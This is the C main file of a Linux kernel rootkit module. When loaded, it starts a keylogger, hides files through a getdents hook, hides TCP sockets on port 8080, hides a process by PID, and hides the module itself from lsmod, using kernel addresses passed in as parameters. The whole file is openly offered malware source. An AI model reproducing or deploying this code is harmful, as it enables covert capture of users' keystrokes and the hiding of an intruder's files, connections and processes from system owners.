#include "./headers/rootkit.h"
#include <linux/module.h>
#include <linux/kernel.h>
/*by defult its load the module with all fetures running*/
/*
fetures such as:
1. keyloging
2. hide the module form lsmod
3. hide file by the name provide
4. hide tcp sockets by port 
*/
bool check_parms(void)
{
    if(sys_call_table_addr_str == NULL){return false;}
    else if(sysfs_remove_dir_addr_str == NULL){return false;}
    else if(sysfs_create_dir_ns_addr_str == NULL){return false;}
    else if(tcp4_seq_show_addr_str == NULL){return false;}
    return true;

}
void hundle_parms(void)
{
    char* ptr;
    sys_call_table_addr = strtoul(sys_call_table_addr_str,&ptr, 10);
    sysfs_remove_dir_addr = strtoul(sysfs_remove_dir_addr_str,&ptr, 10);
    sysfs_create_dir_ns_addr = strtoul(sysfs_create_dir_ns_addr_str,&ptr, 10);
    tcp4_seq_show_addr = strtoul(tcp4_seq_show_addr_str,&ptr, 10);
}
static int __init start_rootkit(void)
{
    if(!check_parms())
    {
        printk(KERN_ALERT "rk: error in prams! -> stop loading the module");

    }
    hundle_parms();
    ret=0;
    extern struct dentry *subdir;
    subdir = debugfs_create_dir("rootkit", NULL);
    if (!subdir)
    {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    


    //KEYLOGGER AND HIDE THE MODULE
    ret = run_keylogger();
    if (ret ==-1)
    {
        printk(KERN_ALERT "rk: keylogger could not load!");
        printk(KERN_ALERT "rk: could not  module hide himself!");
        return -1;
    }
    printk(KERN_ALERT "rk: keylogger load!");
    //HIDE FILE
    ret = getdents_hook_init();
    if (ret==-1)
    {
        printk(KERN_ALERT "rk: could not hide the file!");
        return -1;
    }
    printk(KERN_ALERT "rk: hide file secsessfully!");
    //HIDE TCP ON PORT 8080

    ret = netstat_hide();
    printk(KERN_ALERT "rk: HIDE PORT 8080!");

    //PROCESS HIDE
    ret = process_hide();
    if (ret==-1)
    {
        printk(KERN_ALERT "rk: could not hide the process by the pid!");
        return -1;
    }
    printk(KERN_ALERT "rk: hide the proces!");
    ret = start_hide();
    printk("module hide");
    return 0;


}
static void __exit remove_rootkit(void)
{
    stop_keylogger();
    netstat_unhide();
    remove_hook();
    process_unhide();
}
module_init(start_rootkit);
module_exit(remove_rootkit);